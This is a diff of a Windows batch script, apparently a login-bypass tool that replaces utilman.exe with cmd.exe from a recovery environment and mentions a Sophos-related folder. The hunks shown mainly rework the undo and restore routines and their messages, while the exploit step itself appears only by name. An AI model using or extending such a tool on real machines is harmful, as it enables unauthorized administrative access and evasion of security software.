@@ -210,7 +210,7 @@ if not exist "!autorunScript!" (
   goto :cmdFail
 )
 
-echo Patch files located!
+echo Patch files located^!
 echo Starting Patch...
 
 if not exist C:\SophosUtility (
@@ -246,17 +246,11 @@ if exist "c:\windows\system32\utilman.old" (
   timeout /t 5 
   goto menu
 )
-if exist "c:\windows\system32\cmd.exe" (
-  echo Original cmd.exe file found
-) else (
-  color 0C
-  call :showDinoError
-  echo Could not find cmd.exe... & echo: & echo Failing Exploit and returning to menu
-  timeout /t 5 
-  goto menu
+if not exist "c:\windows\system32\cmd.exe" (
+  echo You seem to be missing the original cmd.exe file, try option 3 to restore it
 )
 if exist "c:\windows\system32\utilman.exe" (
-  echo Exploit utilman.exe file found
+  echo Exploited utilman.exe file found
 ) else (
   color 0C
   call :showDinoError
@@ -265,11 +259,10 @@ if exist "c:\windows\system32\utilman.exe" (
   goto menu
 )
 
-echo All system files located! & echo: & echo Starting restore...
-echo Deleting exploited utilman.exe
-del C:\windows\system32\utilman.exe || goto cmdFail
-echo Renaming utilman.old to utilman.exe 
-ren C:\windows\system32\utilman.old utilman.exe || goto cmdFail
+echo All system files located^! & echo: & echo Starting undo...
+echo Renaming utilman.old to utilman.exe....
+copy /y C:\windows\system32\utilman.old C:\windows\system32\utilman.exe || goto :cmdFail
+
 
 color 0A
 echo -----------------------------------
@@ -280,39 +273,39 @@ goto menu
 :restore-original-files
 cls
 echo Preparing restore...
+set "cmdBackup=X:\sources\restore\cmd.exe"
+set "utilmanBackup=X:\sources\restore\utilman.exe"
 if exist "x:\sources\restore" (
   echo Located restore folder
 ) else (
   color 0C
   call :showDinoError
-  echo Could not find Restore Folder... & echo: & echo Failing Exploit and returning to menu
+  echo Could not find Restore Folder, place the original files in a folder called restore... & echo: & echo Failing Exploit and returning to menu
   timeout /t 5 
   goto menu
 )
-if exist "x:\sources\restore\cmd.exe" (
+if exist !cmdBackup! (
   echo Command Prompt backup found
 ) else (
   color 0C
   call :showDinoError
-  echo Could not find Command Prompt backup... & echo: & echo Failing Exploit and returning to menu
+  echo Could not find Command Prompt backup, you can find the original file in the GitHub repository... & echo: & echo Failing Exploit and returning to menu
   timeout /t 5 
   goto menu
 )
-if exist "x:\sources\restore\utilman.exe" (
+if exist !utilmanBackup! (
   echo Utilman backup found
 ) else (
   color 0C
   call :showDinoError
-  echo Could not find Utilman backup... & echo: & echo Failing Exploit and returning to menu
+  echo Could not find Utilman backup,  you can find the original file in the GitHub repository... & echo: & echo Failing Exploit and returning to menu
   timeout /t 5 
   goto menu
 )
 
-echo Backup files located! & echo: & echo Starting restore...
-echo Deleting exploited utilman.exe
-del C:\windows\system32\utilman.exe || goto :cmdFail
-echo Renaming utilman.old to utilman.exe
-ren C:\windows\system32\utilman.old utilman.exe || goto :cmdFail
+echo Backup files located^! & echo: & echo Starting restore...
+copy /y !utilmanBackup! C:\windows\system32 || goto :cmdFail
+copy /y !cmdBackup! C:\windows\system32 || goto :cmdFail
 
 color 0A
 echo -----------------------------------
